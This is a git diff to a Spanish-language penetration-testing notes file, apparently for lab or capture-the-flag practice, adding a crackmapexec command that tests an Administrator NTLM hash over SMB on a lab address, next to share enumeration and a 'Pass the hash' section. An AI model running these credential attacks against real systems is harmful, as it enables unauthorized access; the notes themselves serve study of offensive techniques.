@@ -1445,6 +1445,12 @@ Para enumerar los shares
 crackmapexec smb 127.0.0.1 -u 's4vitar' -p 'password123.' --shares
 ```
 
+Para probar el hash de un usuario ( y mas si creeomos que es el Administrator)
+
+```
+crackmapexec smb 10.129.185.202 -u 'Adminsitrator' -H e0fb1fb85756c24235ff238cbe81fe00
+```
+
 ## Pass the hash
 
 Si conseguimos el hash del administrador y el puerto 445 (al parecer esta abierto se puede hacer esto..
